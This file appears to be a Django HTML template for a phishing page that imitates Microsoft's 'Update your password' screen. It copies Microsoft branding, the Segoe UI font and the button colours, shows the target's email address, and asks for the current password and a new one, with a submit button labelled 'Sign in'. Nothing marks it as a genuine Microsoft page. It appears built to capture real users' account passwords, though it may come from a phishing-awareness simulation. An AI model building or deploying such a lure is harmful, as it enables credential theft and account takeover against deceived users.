{% load static %}
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Update your password</title>

    <!-- Segoe UI font -->
    <link href="https://fonts.cdnfonts.com/css/segoe-ui-4" rel="stylesheet">
    <style>
        /* Background */
        .bg {
            background-image: url('https://wallpaperaccess.com/full/3124510.jpg');
            background-size: cover;
            background-position: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: -1;
            filter: brightness(0.75);
        }

        /* Main Panel */
        .panel {
            background: white;
            width: 390px;
            padding: 45px;
            margin: 70px auto;
            font-family: "Segoe UI", sans-serif;
            box-shadow: 0 0 18px rgba(0, 0, 0, 0.25);
        }

        /* Microsoft Logo */
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 32px;
        }

        .ms-logo {
            height: 28px;
        }

        .ms-brand {
            font-family: "Segoe UI", sans-serif;
            font-size: 26px;
            font-weight: 600;
            letter-spacing: 0.2px;
            color: #262626;
        }

        /* Email */
        .email {
            color: #555;
            margin-bottom: 25px;
            font-size: 15px;
        }

        /* Title */
        h1 {
            font-size: 25px;
            margin: 0 0 15px 0;
            font-weight: 600;
        }

        /* Description */
        .text {
            font-size: 14px;
            color: #666;
            margin-bottom: 30px;
            line-height: 1.4;
        }

        /* Inputs */
        form input {
            width: 100%;
            border: none;
            border-bottom: 1px solid #aaa;
            padding: 10px 0;
            margin-bottom: 20px;
            font-size: 15px;
            outline: none;
        }

        /* Button */
        button {
            width: 100%;
            padding: 13px 0;
            background-color: #0078D4;
            border: none;
            color: white;
            font-size: 16px;
            cursor: pointer;
            margin-top: 5px;
        }

        button:hover {
            background-color: #006CBE;
        }

        /* Error message */
        .error {
            color: red;
            margin-top: 15px;
            font-size: 14px;
        }
    </style>
</head>

<body>

    <div class="bg"></div>

    <div class="panel">

        <div class="logo">
            <img class="ms-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg"
                alt="Microsoft logo">
            <span class="ms-brand">Microsoft</span>
        </div>

        <div class="email">{{ user_email }}</div>

        <h1>Update your password</h1>

        <p class="text">
            You need to update your password because this is the first time you
            are signing in, or because your password has expired.
        </p>

        <form method="POST">
            {% csrf_token %}

            <input type="password" name="current_password" placeholder="Current password" required>
            <input type="password" name="new_password" placeholder="New password" required>
            <input type="password" name="confirm_password" placeholder="Confirm password" required>

            <button type="submit">Sign in</button>
        </form>

        {% if error %}
        <p class="error">{{ error }}</p>
        {% endif %}

    </div>

</body>

</html>
